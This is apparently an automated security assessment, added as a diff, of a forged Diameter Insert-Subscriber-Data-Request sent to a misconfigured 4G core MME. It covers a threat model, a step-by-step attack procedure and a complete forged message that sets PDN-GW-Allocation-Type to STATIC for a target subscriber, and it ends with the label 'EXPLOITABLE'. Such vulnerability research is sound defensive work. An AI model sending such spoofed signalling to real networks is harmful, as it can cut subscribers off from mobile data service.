@@ -1,0 +1,102 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - On S6a, the victim is the **MME** and the spoofed sender role is the **HSS**. Due to misconfiguration, the MME accepts a forged **Insert-Subscriber-Data-Request (IDR, Command-Code 319)** from an attacker acting as HSS, and processes subscriber-profile updates for a known target subscriber.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the MME, send crafted IDR requests, and receive the corresponding answers. The attacker cannot observe or alter legitimate HSS<->MME traffic and has no extra NAS/GTP/radio capabilities. The question is therefore whether changing `Subscription-Data.APN-Configuration-Profile.APN-Configuration.PDN-GW-Allocation-Type` alone creates concrete harmful control over MME behavior.
+
+### **Exploitability Analysis:**
+`PDN-GW-Allocation-Type` is **field-specifically exploitable** under this threat model.
+
+This AVP is not mere metadata about the sender. It is an **authoritative 3GPP subscriber-provisioning parameter** inside `Subscription-Data > APN-Configuration-Profile > APN-Configuration`, delivered by IDR from HSS to MME and typically cached in the subscriber's APN configuration. Its type is Enumerated, with semantics corresponding to **static vs dynamic PDN-GW allocation/selection** for the specific APN instance identified in practice by `Context-Identifier` and `Service-Selection`.
+
+The field-specific causal chain is:
+
+1. The attacker forges an **IDR** to the MME for a known subscriber and includes a valid `Subscription-Data` tree containing an `APN-Configuration` for the target APN.
+2. Inside that APN configuration, the attacker changes `PDN-GW-Allocation-Type` to a malicious value, e.g. **STATIC** when the legitimate provisioning would be **DYNAMIC**, or vice versa.
+3. The MME treats the AVP as trusted HSS provisioning input, stores or overwrites the APN profile for that subscriber, and later reuses it during attach or UE-requested PDN connectivity processing.
+4. Because this field directly affects **PGW allocation/selection behavior**, the MME may later:
+   - attempt static PGW use when dynamic selection should occur,
+   - perform dynamic selection when a fixed PGW association was intended,
+   - or operate on an internally inconsistent APN configuration.
+5. The resulting downstream effect is concrete subscriber-impacting behavior: **PDN connectivity failure, default bearer establishment failure, attach failure for the default APN, or wrong PGW anchoring/routing** for that APN.
+
+This is a genuine field-driven effect, not just "forged IDR is bad." The incremental control comes from the fact that this AVP changes a specific provisioning attribute the MME later consumes in PGW-selection logic. While some outcomes depend on coherent surrounding APN data, the evidence supports that the field itself is part of the decision input and can poison stored APN state for later use.
+
+The impact is usually **delayed rather than immediate**: it materializes when the MME next evaluates that APN configuration for attach/PDN session establishment. It is also **persistent within the cached subscriber context** until overwritten by a later legitimate subscription refresh, detach/purge, or another IDR.
+
+### **Attack Procedure:**
+Craft a forged **Insert-Subscriber-Data-Request** from the attacker-controlled Diameter connection to the target MME with:
+- normal IDR framing AVPs,
+- the target subscriber identity in `User-Name`,
+- `Subscription-Data`,
+- `APN-Configuration-Profile`,
+- one `APN-Configuration` for the target APN including:
+  - `Context-Identifier`,
+  - `Service-Selection`,
+  - `PDN-GW-Allocation-Type` set to the malicious value,
+  - minimally coherent sibling APN data such as `PDN-Type`.
+
+For a practical denial scenario, set `PDN-GW-Allocation-Type` to **STATIC** for an APN that normally uses dynamic PGW selection, without providing matching coherent static-PGW provisioning. The expected success condition is that the MME accepts the IDR and later the subscriber experiences **attach/default bearer/PDN connectivity failure** or mis-anchored PGW selection for that APN.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    { "name": "Session-Id", "value": "attacker-hss.example.net;1720456789;1" },
+    { "name": "Auth-Session-State", "value": 1 },
+    { "name": "Origin-Host", "value": "hss.attacker.example.net" },
+    { "name": "Origin-Realm", "value": "attacker.example.net" },
+    { "name": "Destination-Host", "value": "mme01.visited.example.net" },
+    { "name": "Destination-Realm", "value": "visited.example.net" },
+    { "name": "User-Name", "value": "001010123456789" },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    { "name": "IDR-Flags", "value": 0 },
+    {
+      "name": "Subscription-Data",
+      "vendor_id": 10415,
+      "value": {
+        "APN-Configuration-Profile": {
+          "Context-Identifier": 1,
+          "All-APN-Configurations-Included-Indicator": 0,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "Service-Selection": "internet",
+              "PDN-Type": 0,
+              "PDN-GW-Allocation-Type": "STATIC",
+              "EPS-Subscribed-QoS-Profile": {
+                "QoS-Class-Identifier": 9,
+                "Allocation-Retention-Priority": {
+                  "Priority-Level": 15,
+                  "Pre-emption-Capability": 1,
+                  "Pre-emption-Vulnerability": 0
+                }
+              },
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 1000000,
+                "Max-Requested-Bandwidth-DL": 1000000
+              }
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
